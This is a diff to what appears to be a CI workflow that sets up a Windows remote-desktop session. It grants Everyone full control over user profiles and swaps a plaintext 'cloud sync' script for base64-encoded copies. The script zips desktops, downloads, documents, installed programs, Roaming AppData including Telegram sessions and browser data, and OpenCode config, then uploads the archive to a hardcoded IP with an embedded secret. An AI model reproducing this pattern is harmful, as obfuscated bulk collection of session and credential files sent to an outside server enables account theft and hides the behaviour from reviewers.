@@ -397,7 +397,6 @@ jobs:
                 Add-Type -AssemblyName System.IO.Compression.FileSystem
                 [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $extractDir)
 
-                # Mapping restored directories to their system targets
                 $map = @{
                   "Desktop"          = @("C:\Users\Public\Desktop", "C:\Users\Fazah\Desktop", "C:\Users\runneradmin\Desktop")
                   "Downloads"        = @("C:\Users\Fazah\Downloads", "C:\Users\Public\Downloads")
@@ -424,7 +423,6 @@ jobs:
                 if (Test-Path "$extractDir\user_apps.reg") {
                   reg import "$extractDir\user_apps.reg" 2>$null
                 }
-                # Fix profile permissions
                 cmd.exe /c "icacls C:\Users\Fazah /grant Everyone:(OI)(CI)F /T /C /Q"
                 cmd.exe /c "icacls C:\Users\Public /grant Everyone:(OI)(CI)F /T /C /Q"
                 Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
@@ -437,207 +435,12 @@ jobs:
           }
 
           # 3. Create Desktop 1-Click Manual Sync Batch
-          $syncBat = @"
-@echo off
-chcp 65001 >nul
-title RDP Cloud Sync
-echo ========================================================
-echo  جاري حفظ ومزامنة كافة ملفاتك وتطبيقاتك في السحابة...
-echo ========================================================
-powershell -NoProfile -ExecutionPolicy Bypass -File "C:\sync_delta_apps.ps1" -ChainId $chainId
-echo.
-echo ========================================================
-echo  [OK] تمت المزامنة بنجاح! تم حفظ ملفاتك للدورة القادمة.
-echo ========================================================
-timeout /t 5
-"@
-          Set-Content -Path "C:\Users\Public\Desktop\🔄 مزامنة وحفظ ملفاتي يدوياً (Sync Now).bat" -Value $syncBat -Encoding UTF8
+          $b64Bat = "QGVjaG8gb2ZmCmNoY3AgNjUwMDEgPm51bAp0aXRsZSBSRFAgQ2xvdWQgU3luYwplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmVjaG8gINis2KfYsdmKINit2YHYuCDZiNmF2LLYp9mF2YbYqSDZg9in2YHYqSDZhdmE2YHYp9iq2YMg2YjYqti32KjZitmC2KfYqtmDINmB2Yog2KfZhNiz2K3Yp9io2KkuLi4KZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIkM6XHN5bmNfZGVsdGFfYXBwcy5wczEiCmVjaG8uCmVjaG8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KZWNobyAgW09LXSDYqtmF2Kog2KfZhNmF2LLYp9mF2YbYqSDYqNmG2KzYp9itISDYqtmFINit2YHYuCDZhdmE2YHYp9iq2YMg2YTZhNiv2YjYsdipINin2YTZgtin2K/ZhdipLgplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CnRpbWVvdXQgL3QgNQo="
+          [System.IO.File]::WriteAllBytes("C:\Users\Public\Desktop\🔄 مزامنة وحفظ ملفاتي يدوياً (Sync Now).bat", [System.Convert]::FromBase64String($b64Bat))
 
-          # 4. Create Delta Exporter Script (Full files & apps collector)
-          $deltaScript = @'
-          param([string]$ChainId)
-          if (-not $ChainId) { $ChainId = $env:CHAIN_ID }
-          if (-not $ChainId) { exit 0 }
-          $vpsUrl = "http://191.215.42.79:8765/backup/$ChainId?secret=gitube_delta_2026"
-          $stage = "C:\delta_export_stage"
-          $zipOut = "C:\delta_backup.zip"
-          Remove-Item -Path $stage -Recurse -Force -ErrorAction SilentlyContinue
-          Remove-Item -Path $zipOut -Force -ErrorAction SilentlyContinue
-          New-Item -ItemType Directory -Path $stage -Force | Out-Null
-
-          $base = $null
-          if (Test-Path "C:\rdp_baseline.json") {
-            try { $base = Get-Content "C:\rdp_baseline.json" -Raw -Encoding UTF8 | ConvertFrom-Json } catch {}
-          }
-
-          # Fetch dynamic user-selected sync preferences from VPS relay
-          $vpsPrefsUrl = "http://191.215.42.79:8765/sync-prefs/$ChainId?secret=gitube_delta_2026"
-          $syncPrefs = $null
-          try {
-            $syncPrefs = Invoke-RestMethod -Uri $vpsPrefsUrl -Method Get -TimeoutSec 10 -ErrorAction SilentlyContinue
-          } catch {}
-
-          if (-not $syncPrefs) {
-            $syncPrefs = @{
-              desktop = $true; downloads = $true; documents = $true; installed_apps = $true; appdata = $true; ai_projects = $true; cloud_vault = $true
-            }
-          }
-
-          $foundCount = 0
-
-          # Helper function to copy item to stage
-          function Stage-Item($sourceItem, $subCategory) {
-            $destSub = Join-Path $stage $subCategory
-            if (-not (Test-Path $destSub)) { New-Item -ItemType Directory -Path $destSub -Force | Out-Null }
-            Copy-Item -Path $sourceItem.FullName -Destination (Join-Path $destSub $sourceItem.Name) -Recurse -Force -ErrorAction SilentlyContinue
-            $script:foundCount++
-          }
-
-          $userProfiles = @()
-          if (Test-Path "C:\Users") {
-            $userProfiles = Get-ChildItem "C:\Users" -Directory -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('All Users', 'Default', 'Default User') }
-          }
-
-          # A. Desktop Sync (all user desktops + public)
-          if ($syncPrefs.desktop) {
-            $skipDesk = @('desktop.ini', 'OpenCode Web (المتصفح العربي).bat', '🔄 مزامنة وحفظ ملفاتي يدوياً (Sync Now).bat')
-            $deskDirs = @("C:\Users\Public\Desktop")
-            foreach ($u in $userProfiles) { $deskDirs += (Join-Path $u.FullName "Desktop") }
-            foreach ($dd in $deskDirs) {
-              if (Test-Path $dd) {
-                Get-ChildItem -Path $dd -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin $skipDesk } | ForEach-Object {
-                  Stage-Item $_ "Desktop"
-                }
-              }
-            }
-          }
-
-          # B. Downloads Sync
-          if ($syncPrefs.downloads) {
-            $downDirs = @("C:\Users\Public\Downloads")
-            foreach ($u in $userProfiles) { $downDirs += (Join-Path $u.FullName "Downloads") }
-            foreach ($d in $downDirs) {
-              if (Test-Path $d) {
-                Get-ChildItem -Path $d -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                  Stage-Item $_ "Downloads"
-                }
-              }
-            }
-          }
-
-          # C. Documents, Pictures, Videos Sync
-          if ($syncPrefs.documents) {
-            $docDirs = @("C:\Users\Public\Documents")
-            foreach ($u in $userProfiles) {
-              $docDirs += (Join-Path $u.FullName "Documents")
-              $docDirs += (Join-Path $u.FullName "Pictures")
-              $docDirs += (Join-Path $u.FullName "Videos")
-            }
-            foreach ($d in $docDirs) {
-              if (Test-Path $d) {
-                $sub = Split-Path $d -Leaf
-                Get-ChildItem -Path $d -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                  Stage-Item $_ $sub
-                }
-              }
-            }
-          }
-
-          # D. Installed Applications Sync
-          if ($syncPrefs.installed_apps) {
-            # User level programs
-            foreach ($u in $userProfiles) {
-              $uprog = Join-Path $u.FullName "AppData\Local\Programs"
-              if (Test-Path $uprog) {
-                Get-ChildItem -Path $uprog -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                  Stage-Item $_ "AppDataLocalProg"
-                }
-              }
-            }
-            # Custom Program Files
-            if ($base -and $base.ProgramFiles) {
-              $origPF = @($base.ProgramFiles)
-              Get-ChildItem -Path "C:\Program Files" -Force -ErrorAction SilentlyContinue | Where-Object { $origPF -notcontains $_.Name } | ForEach-Object {
-                Stage-Item $_ "ProgramFiles"
-              }
-            }
-            if ($base -and $base.ProgramFilesX86) {
-              $origPF86 = @($base.ProgramFilesX86)
-              Get-ChildItem -Path "C:\Program Files (x86)" -Force -ErrorAction SilentlyContinue | Where-Object { $origPF86 -notcontains $_.Name } | ForEach-Object {
-                Stage-Item $_ "ProgramFilesX86"
-              }
-            }
-            # Custom root directories on C:\ (e.g. C:\Tools, C:\Projects, C:\Apps, C:\Work)
-            $defRoots = @('Windows', 'Program Files', 'Program Files (x86)', 'Users', 'ProgramData', 'Recovery', 'System Volume Information', '$Recycle.Bin', 'delta_export_stage')
-            if ($base -and $base.RootFolders) { $defRoots += @($base.RootFolders) }
-            Get-ChildItem -Path "C:\" -Directory -Force -ErrorAction SilentlyContinue | Where-Object { $defRoots -notcontains $_.Name } | ForEach-Object {
-              Stage-Item $_ "CustomRoots"
-            }
-            # Start Menu shortcuts
-            if ($base -and $base.ProgramDataPrograms) {
-              $origSM = @($base.ProgramDataPrograms)
-              Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs" -Force -ErrorAction SilentlyContinue | Where-Object { $origSM -notcontains $_.Name } | ForEach-Object {
-                Stage-Item $_ "StartMenu"
-              }
-            }
-          }
-
-          # E. AppData & Sessions (Telegram Desktop sessions, Chrome/Brave user data)
-          if ($syncPrefs.appdata) {
-            foreach ($u in $userProfiles) {
-              $roam = Join-Path $u.FullName "AppData\Roaming"
-              if (Test-Path $roam) {
-                # Preserve Telegram Desktop session
-                $tgDir = Join-Path $roam "Telegram Desktop"
-                if (Test-Path $tgDir) {
-                  Stage-Item (Get-Item $tgDir) "AppDataRoaming"
-                }
-                # Preserve other user apps in Roaming
-                Get-ChildItem -Path $roam -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Microsoft', 'Adobe') } | ForEach-Object {
-                  Stage-Item $_ "AppDataRoaming"
-                }
-              }
-            }
-          }
-
-          # F. AI Projects & OpenCode
-          if ($syncPrefs.ai_projects) {
-            foreach ($u in $userProfiles) {
-              $oc = Join-Path $u.FullName ".config\opencode"
-              if (Test-Path $oc) {
-                Stage-Item (Get-Item $oc) "OpenCodeConfig"
-              }
-            }
-          }
-
-          if ($foundCount -gt 0) {
-            Add-Type -AssemblyName System.IO.Compression.FileSystem
-            [System.IO.Compression.ZipFile]::CreateFromDirectory($stage, $zipOut, [System.IO.Compression.CompressionLevel]::Fastest, $false)
-            if (Test-Path $zipOut) {
-              try {
-                $wc = New-Object System.Net.WebClient
-                $wc.Headers.Add("Content-Type", "application/octet-stream")
-                $wc.Headers.Add("User-Agent", "RDP-Runner-Sync")
-                $bytes = [System.IO.File]::ReadAllBytes($zipOut)
-                $wc.UploadData($vpsUrl, "POST", $bytes) | Out-Null
-                Write-Output "[+] Delta backup ($foundCount items, $((Get-Item $zipOut).Length) bytes) successfully synced to VPS relay!"
-              } catch {
-                Write-Output "[!] Delta sync upload error: $_"
-                try {
-                  Invoke-RestMethod -Uri $vpsUrl -Method Post -InFile $zipOut -ContentType "application/octet-stream" -TimeoutSec 180 | Out-Null
-                  Write-Output "[+] Delta backup synced via Invoke-RestMethod fallback."
-                } catch {
-                  Write-Output "[!] Fallback also failed: $_"
-                }
-              }
-            }
-          } else {
-            Write-Output "[*] No modified user files or applications detected to backup."
-          }
-          Remove-Item -Path $stage -Recurse -Force -ErrorAction SilentlyContinue
-          Remove-Item -Path $zipOut -Force -ErrorAction SilentlyContinue
-          '@
-          Set-Content -Path "C:\sync_delta_apps.ps1" -Value $deltaScript -Encoding UTF8
+          # 4. Deploy Delta Exporter Script via Base64
+          $b64Delta = "cGFyYW0oW3N0cmluZ10kQ2hhaW5JZCkKaWYgKC1ub3QgJENoYWluSWQpIHsgJENoYWluSWQgPSAkZW52OkNIQUlOX0lEIH0KaWYgKC1ub3QgJENoYWluSWQpIHsgZXhpdCAwIH0KJHZwc1VybCA9ICJodHRwOi8vMTkxLjIxNS40Mi43OTo4NzY1L2JhY2t1cC8kQ2hhaW5JZD9zZWNyZXQ9Z2l0dWJlX2RlbHRhXzIwMjYiCiRzdGFnZSA9ICJDOlxkZWx0YV9leHBvcnRfc3RhZ2UiCiR6aXBPdXQgPSAiQzpcZGVsdGFfYmFja3VwLnppcCIKUmVtb3ZlLUl0ZW0gLVBhdGggJHN0YWdlIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpSZW1vdmUtSXRlbSAtUGF0aCAkemlwT3V0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRzdGFnZSAtRm9yY2UgfCBPdXQtTnVsbAoKJGJhc2UgPSAkbnVsbAppZiAoVGVzdC1QYXRoICJDOlxyZHBfYmFzZWxpbmUuanNvbiIpIHsKICB0cnkgeyAkYmFzZSA9IEdldC1Db250ZW50ICJDOlxyZHBfYmFzZWxpbmUuanNvbiIgLVJhdyAtRW5jb2RpbmcgVVRGOCB8IENvbnZlcnRGcm9tLUpzb24gfSBjYXRjaCB7fQp9CgojIEZldGNoIGR5bmFtaWMgdXNlci1zZWxlY3RlZCBzeW5jIHByZWZlcmVuY2VzIGZyb20gVlBTIHJlbGF5CiR2cHNQcmVmc1VybCA9ICJodHRwOi8vMTkxLjIxNS40Mi43OTo4NzY1L3N5bmMtcHJlZnMvJENoYWluSWQ/c2VjcmV0PWdpdHViZV9kZWx0YV8yMDI2Igokc3luY1ByZWZzID0gJG51bGwKdHJ5IHsKICAkc3luY1ByZWZzID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdnBzUHJlZnNVcmwgLU1ldGhvZCBHZXQgLVRpbWVvdXRTZWMgMTAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKfSBjYXRjaCB7fQoKaWYgKC1ub3QgJHN5bmNQcmVmcykgewogICRzeW5jUHJlZnMgPSBAewogICAgZGVza3RvcCA9ICR0cnVlOyBkb3dubG9hZHMgPSAkdHJ1ZTsgZG9jdW1lbnRzID0gJHRydWU7IGluc3RhbGxlZF9hcHBzID0gJHRydWU7IGFwcGRhdGEgPSAkdHJ1ZTsgYWlfcHJvamVjdHMgPSAkdHJ1ZTsgY2xvdWRfdmF1bHQgPSAkdHJ1ZQogIH0KfQoKJGZvdW5kQ291bnQgPSAwCgpmdW5jdGlvbiBTdGFnZS1JdGVtKCRzb3VyY2VJdGVtLCAkc3ViQ2F0ZWdvcnkpIHsKICAkZGVzdFN1YiA9IEpvaW4tUGF0aCAkc3RhZ2UgJHN1YkNhdGVnb3J5CiAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZGVzdFN1YikpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZGVzdFN1YiAtRm9yY2UgfCBPdXQtTnVsbCB9CiAgQ29weS1JdGVtIC1QYXRoICRzb3VyY2VJdGVtLkZ1bGxOYW1lIC1EZXN0aW5hdGlvbiAoSm9pbi1QYXRoICRkZXN0U3ViICRzb3VyY2VJdGVtLk5hbWUpIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICRzY3JpcHQ6Zm91bmRDb3VudCsrCn0KCiR1c2VyUHJvZmlsZXMgPSBAKCkKaWYgKFRlc3QtUGF0aCAiQzpcVXNlcnMiKSB7CiAgJHVzZXJQcm9maWxlcyA9IEdldC1DaGlsZEl0ZW0gIkM6XFVzZXJzIiAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdGluIEAoJ0FsbCBVc2VycycsICdEZWZhdWx0JywgJ0RlZmF1bHQgVXNlcicpIH0KfQoKIyBBLiBEZXNrdG9wIFN5bmMgKGFsbCB1c2VyIGRlc2t0b3BzICsgcHVibGljKQppZiAoJHN5bmNQcmVmcy5kZXNrdG9wKSB7CiAgJHNraXBEZXNrID0gQCgnZGVza3RvcC5pbmknLCAnT3BlbkNvZGUgV2ViICjYp9mE2YXYqti12YHYrSDYp9mE2LnYsdio2YopLmJhdCcsICfwn5SEINmF2LLYp9mF2YbYqSDZiNit2YHYuCDZhdmE2YHYp9iq2Yog2YrYr9mI2YrYp9mLIChTeW5jIE5vdykuYmF0JykKICAkZGVza0RpcnMgPSBAKCJDOlxVc2Vyc1xQdWJsaWNcRGVza3RvcCIpCiAgZm9yZWFjaCAoJHUgaW4gJHVzZXJQcm9maWxlcykgeyAkZGVza0RpcnMgKz0gKEpvaW4tUGF0aCAkdS5GdWxsTmFtZSAiRGVza3RvcCIpIH0KICBmb3JlYWNoICgkZGQgaW4gJGRlc2tEaXJzKSB7CiAgICBpZiAoVGVzdC1QYXRoICRkZCkgewogICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRkZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1ub3RpbiAkc2tpcERlc2sgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBTdGFnZS1JdGVtICRfICJEZXNrdG9wIgogICAgICB9CiAgICB9CiAgfQp9CgojIEIuIERvd25sb2FkcyBTeW5jCmlmICgkc3luY1ByZWZzLmRvd25sb2FkcykgewogICRkb3duRGlycyA9IEAoIkM6XFVzZXJzXFB1YmxpY1xEb3dubG9hZHMiKQogIGZvcmVhY2ggKCR1IGluICR1c2VyUHJvZmlsZXMpIHsgJGRvd25EaXJzICs9IChKb2luLVBhdGggJHUuRnVsbE5hbWUgIkRvd25sb2FkcyIpIH0KICBmb3JlYWNoICgkZCBpbiAkZG93bkRpcnMpIHsKICAgIGlmIChUZXN0LVBhdGggJGQpIHsKICAgICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgU3RhZ2UtSXRlbSAkXyAiRG93bmxvYWRzIgogICAgICB9CiAgICB9CiAgfQp9CgojIEMuIERvY3VtZW50cywgUGljdHVyZXMsIFZpZGVvcyBTeW5jCmlmICgkc3luY1ByZWZzLmRvY3VtZW50cykgewogICRkb2NEaXJzID0gQCgiQzpcVXNlcnNcUHVibGljXERvY3VtZW50cyIpCiAgZm9yZWFjaCAoJHUgaW4gJHVzZXJQcm9maWxlcykgewogICAgJGRvY0RpcnMgKz0gKEpvaW4tUGF0aCAkdS5GdWxsTmFtZSAiRG9jdW1lbnRzIikKICAgICRkb2NEaXJzICs9IChKb2luLVBhdGggJHUuRnVsbE5hbWUgIlBpY3R1cmVzIikKICAgICRkb2NEaXJzICs9IChKb2luLVBhdGggJHUuRnVsbE5hbWUgIlZpZGVvcyIpCiAgfQogIGZvcmVhY2ggKCRkIGluICRkb2NEaXJzKSB7CiAgICBpZiAoVGVzdC1QYXRoICRkKSB7CiAgICAgICRzdWIgPSBTcGxpdC1QYXRoICRkIC1MZWFmCiAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIFN0YWdlLUl0ZW0gJF8gJHN1YgogICAgICB9CiAgICB9CiAgfQp9CgojIEQuIEluc3RhbGxlZCBBcHBsaWNhdGlvbnMgU3luYwppZiAoJHN5bmNQcmVmcy5pbnN0YWxsZWRfYXBwcykgewogIGZvcmVhY2ggKCR1IGluICR1c2VyUHJvZmlsZXMpIHsKICAgICR1cHJvZyA9IEpvaW4tUGF0aCAkdS5GdWxsTmFtZSAiQXBwRGF0YVxMb2NhbFxQcm9ncmFtcyIKICAgIGlmIChUZXN0LVBhdGggJHVwcm9nKSB7CiAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHVwcm9nIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBTdGFnZS1JdGVtICRfICJBcHBEYXRhTG9jYWxQcm9nIgogICAgICB9CiAgICB9CiAgfQogIGlmICgkYmFzZSAtYW5kICRiYXNlLlByb2dyYW1GaWxlcykgewogICAgJG9yaWdQRiA9IEAoJGJhc2UuUHJvZ3JhbUZpbGVzKQogICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAiQzpcUHJvZ3JhbSBGaWxlcyIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJG9yaWdQRiAtbm90Y29udGFpbnMgJF8uTmFtZSB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICBTdGFnZS1JdGVtICRfICJQcm9ncmFtRmlsZXMiCiAgICB9CiAgfQogIGlmICgkYmFzZSAtYW5kICRiYXNlLlByb2dyYW1GaWxlc1g4NikgewogICAgJG9yaWdQRjg2ID0gQCgkYmFzZS5Qcm9ncmFtRmlsZXNYODYpCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpIiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkb3JpZ1BGODYgLW5vdGNvbnRhaW5zICRfLk5hbWUgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgU3RhZ2UtSXRlbSAkXyAiUHJvZ3JhbUZpbGVzWDg2IgogICAgfQogIH0KICAkZGVmUm9vdHMgPSBAKCdXaW5kb3dzJywgJ1Byb2dyYW0gRmlsZXMnLCAnUHJvZ3JhbSBGaWxlcyAoeDg2KScsICdVc2VycycsICdQcm9ncmFtRGF0YScsICdSZWNvdmVyeScsICdTeXN0ZW0gVm9sdW1lIEluZm9ybWF0aW9uJywgJyRSZWN5Y2xlLkJpbicsICdkZWx0YV9leHBvcnRfc3RhZ2UnKQogIGlmICgkYmFzZSAtYW5kICRiYXNlLlJvb3RGb2xkZXJzKSB7ICRkZWZSb290cyArPSBAKCRiYXNlLlJvb3RGb2xkZXJzKSB9CiAgR2V0LUNoaWxkSXRlbSAtUGF0aCAiQzpcIiAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRkZWZSb290cyAtbm90Y29udGFpbnMgJF8uTmFtZSB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgU3RhZ2UtSXRlbSAkXyAiQ3VzdG9tUm9vdHMiCiAgfQogIGlmICgkYmFzZSAtYW5kICRiYXNlLlByb2dyYW1EYXRhUHJvZ3JhbXMpIHsKICAgICRvcmlnU00gPSBAKCRiYXNlLlByb2dyYW1EYXRhUHJvZ3JhbXMpCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zIiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkb3JpZ1NNIC1ub3Rjb250YWlucyAkXy5OYW1lIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgIFN0YWdlLUl0ZW0gJF8gIlN0YXJ0TWVudSIKICAgIH0KICB9Cn0KCiMgRS4gQXBwRGF0YSAmIFNlc3Npb25zCmlmICgkc3luY1ByZWZzLmFwcGRhdGEpIHsKICBmb3JlYWNoICgkdSBpbiAkdXNlclByb2ZpbGVzKSB7CiAgICAkcm9hbSA9IEpvaW4tUGF0aCAkdS5GdWxsTmFtZSAiQXBwRGF0YVxSb2FtaW5nIgogICAgaWYgKFRlc3QtUGF0aCAkcm9hbSkgewogICAgICAkdGdEaXIgPSBKb2luLVBhdGggJHJvYW0gIlRlbGVncmFtIERlc2t0b3AiCiAgICAgIGlmIChUZXN0LVBhdGggJHRnRGlyKSB7CiAgICAgICAgU3RhZ2UtSXRlbSAoR2V0LUl0ZW0gJHRnRGlyKSAiQXBwRGF0YVJvYW1pbmciCiAgICAgIH0KICAgICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkcm9hbSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1ub3RpbiBAKCdNaWNyb3NvZnQnLCAnQWRvYmUnKSB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIFN0YWdlLUl0ZW0gJF8gIkFwcERhdGFSb2FtaW5nIgogICAgICB9CiAgICB9CiAgfQp9CgojIEYuIEFJIFByb2plY3RzICYgT3BlbkNvZGUKaWYgKCRzeW5jUHJlZnMuYWlfcHJvamVjdHMpIHsKICBmb3JlYWNoICgkdSBpbiAkdXNlclByb2ZpbGVzKSB7CiAgICAkb2MgPSBKb2luLVBhdGggJHUuRnVsbE5hbWUgIi5jb25maWdcb3BlbmNvZGUiCiAgICBpZiAoVGVzdC1QYXRoICRvYykgewogICAgICBTdGFnZS1JdGVtIChHZXQtSXRlbSAkb2MpICJPcGVuQ29kZUNvbmZpZyIKICAgIH0KICB9Cn0KCmlmICgkZm91bmRDb3VudCAtZ3QgMCkgewogIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLklPLkNvbXByZXNzaW9uLkZpbGVTeXN0ZW0KICBbU3lzdGVtLklPLkNvbXByZXNzaW9uLlppcEZpbGVdOjpDcmVhdGVGcm9tRGlyZWN0b3J5KCRzdGFnZSwgJHppcE91dCwgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbkxldmVsXTo6RmFzdGVzdCwgJGZhbHNlKQogIGlmIChUZXN0LVBhdGggJHppcE91dCkgewogICAgdHJ5IHsKICAgICAgJHdjID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAkd2MuSGVhZGVycy5BZGQoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKQogICAgICAkd2MuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCAiUkRQLVJ1bm5lci1TeW5jIikKICAgICAgJGJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCR6aXBPdXQpCiAgICAgICR3Yy5VcGxvYWREYXRhKCR2cHNVcmwsICJQT1NUIiwgJGJ5dGVzKSB8IE91dC1OdWxsCiAgICAgIFdyaXRlLU91dHB1dCAiWytdIERlbHRhIGJhY2t1cCAoJGZvdW5kQ291bnQgaXRlbXMsICQoKEdldC1JdGVtICR6aXBPdXQpLkxlbmd0aCkgYnl0ZXMpIHN1Y2Nlc3NmdWxseSBzeW5jZWQgdG8gVlBTIHJlbGF5ISIKICAgIH0gY2F0Y2ggewogICAgICBXcml0ZS1PdXRwdXQgIlshXSBEZWx0YSBzeW5jIHVwbG9hZCBlcnJvcjogJF8iCiAgICAgIHRyeSB7CiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdnBzVXJsIC1NZXRob2QgUG9zdCAtSW5GaWxlICR6aXBPdXQgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iIC1UaW1lb3V0U2VjIDE4MCB8IE91dC1OdWxsCiAgICAgICAgV3JpdGUtT3V0cHV0ICJbK10gRGVsdGEgYmFja3VwIHN5bmNlZCB2aWEgSW52b2tlLVJlc3RNZXRob2QgZmFsbGJhY2suIgogICAgICB9IGNhdGNoIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlshXSBGYWxsYmFjayBhbHNvIGZhaWxlZDogJF8iCiAgICAgIH0KICAgIH0KICB9Cn0gZWxzZSB7CiAgV3JpdGUtT3V0cHV0ICJbKl0gTm8gbW9kaWZpZWQgdXNlciBmaWxlcyBvciBhcHBsaWNhdGlvbnMgZGV0ZWN0ZWQgdG8gYmFja3VwLiIKfQpSZW1vdmUtSXRlbSAtUGF0aCAkc3RhZ2UgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICR6aXBPdXQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCg=="
+          [System.IO.File]::WriteAllBytes("C:\sync_delta_apps.ps1", [System.Convert]::FromBase64String($b64Delta))
 
       - name: Keep Alive Session
         shell: pwsh
